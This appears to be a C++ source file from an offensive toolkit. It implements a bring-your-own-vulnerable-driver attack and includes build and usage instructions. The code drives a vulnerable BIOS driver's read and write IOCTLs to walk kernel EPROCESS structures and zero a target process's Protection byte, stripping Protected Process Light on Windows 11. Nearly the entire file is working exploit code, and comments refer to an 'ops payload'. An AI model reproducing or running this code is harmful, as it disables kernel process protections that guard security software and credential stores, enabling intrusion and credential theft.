// byovd_sample2.cpp — archival reference implementation.
//
// Minimal PPL strip via BiosToolCommonDriver.sys (IOCTLs 0x22202C read /
// 0x222030 write). This is the "hello world" of the technique — resolves
// PsInitialSystemProcess, walks the ActiveProcessLinks list to find the
// target PID's EPROCESS, then zeroes the Protection byte.
//
// Production version lives in src/cascade.cpp (--ppl-strip mode).
// This file is retained for provenance only; do NOT compile into ops payload.
//
// Build:
//   x86_64-w64-mingw32-g++ -O2 -s -static-libgcc -static-libstdc++ \
//       samples/byovd_sample2.cpp -lntdll -o byovd_sample2.exe
//
// Usage:
//   byovd_sample2.exe <PID>
//
// Requires: SeLoadDriverPrivilege, driver already loaded as \\.\BiosToolCommonDriver

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdio>
#include <cstdlib>
#include <cstdint>

#pragma comment(lib, "psapi.lib")

#define DEVICE_PATH   "\\\\.\\BiosToolCommonDriver"
#define IOCTL_READ    0x22202C
#define IOCTL_WRITE   0x222030

// Windows 11 22H2 (build 22621) EPROCESS offsets
constexpr ULONG OFF_UNIQUE_PID       = 0x440;
constexpr ULONG OFF_ACTIVE_LINKS     = 0x448;
constexpr ULONG OFF_PROTECTION       = 0x87A;

#pragma pack(push, 1)
struct BiosReadReq {
    uint64_t address;
    uint32_t size;
    uint8_t  buffer[0x1000];
};
struct BiosWriteReq {
    uint64_t address;
    uint32_t size;
    uint8_t  buffer[0x1000];
};
#pragma pack(pop)

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool KernelRead(uint64_t va, void* out, size_t sz) {
    if (sz > 0x1000) return false;
    BiosReadReq req{}; req.address = va; req.size = (uint32_t)sz;
    DWORD ret = 0;
    if (!DeviceIoControl(g_dev, IOCTL_READ, &req, sizeof(req), &req, sizeof(req), &ret, nullptr))
        return false;
    memcpy(out, req.buffer, sz);
    return true;
}

static bool KernelWrite(uint64_t va, const void* src, size_t sz) {
    if (sz > 0x1000) return false;
    BiosWriteReq req{}; req.address = va; req.size = (uint32_t)sz;
    memcpy(req.buffer, src, sz);
    DWORD ret = 0;
    return DeviceIoControl(g_dev, IOCTL_WRITE, &req, sizeof(req), &req, sizeof(req), &ret, nullptr) != 0;
}

static uint64_t GetKernelBase() {
    LPVOID drivers[1024]; DWORD cbNeeded = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) return 0;
    return (uint64_t)drivers[0];  // ntoskrnl is always first
}

static uint64_t ResolveKernelExport(const char* mod, const char* name) {
    HMODULE h = LoadLibraryExA(mod, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) return 0;
    FARPROC user = GetProcAddress(h, name);
    if (!user) { FreeLibrary(h); return 0; }
    uint64_t rva = (uint64_t)user - (uint64_t)h;
    FreeLibrary(h);
    return GetKernelBase() + rva;
}

int main(int argc, char** argv) {
    if (argc < 2) { printf("usage: %s <pid>\n", argv[0]); return 1; }
    DWORD targetPid = (DWORD)atoi(argv[1]);

    g_dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Open %s failed: %lu (driver loaded?)\n", DEVICE_PATH, GetLastError());
        return 1;
    }

    uint64_t psInitial = ResolveKernelExport("ntoskrnl.exe", "PsInitialSystemProcess");
    if (!psInitial) { printf("[-] Cannot resolve PsInitialSystemProcess\n"); return 1; }

    uint64_t sysEproc = 0;
    if (!KernelRead(psInitial, &sysEproc, sizeof(sysEproc)) || !sysEproc) {
        printf("[-] Kernel read failed\n"); return 1;
    }
    printf("[+] System EPROCESS: 0x%llx\n", (unsigned long long)sysEproc);

    // Walk ActiveProcessLinks
    uint64_t cur = sysEproc;
    for (int i = 0; i < 4096; i++) {
        DWORD pid = 0;
        KernelRead(cur + OFF_UNIQUE_PID, &pid, sizeof(pid));
        if (pid == targetPid) {
            uint8_t prot = 0;
            KernelRead(cur + OFF_PROTECTION, &prot, 1);
            printf("[+] Found PID %lu EPROCESS 0x%llx Protection=0x%02x\n",
                   pid, (unsigned long long)cur, prot);
            uint8_t zero = 0;
            if (KernelWrite(cur + OFF_PROTECTION, &zero, 1)) {
                printf("[+] Protection cleared\n");
            } else {
                printf("[-] Write failed\n");
            }
            CloseHandle(g_dev);
            return 0;
        }
        uint64_t flink = 0;
        KernelRead(cur + OFF_ACTIVE_LINKS, &flink, sizeof(flink));
        if (!flink) break;
        cur = flink - OFF_ACTIVE_LINKS;
        if (cur == sysEproc) break;
    }
    printf("[-] PID %lu not found\n", targetPid);
    CloseHandle(g_dev);
    return 1;
}
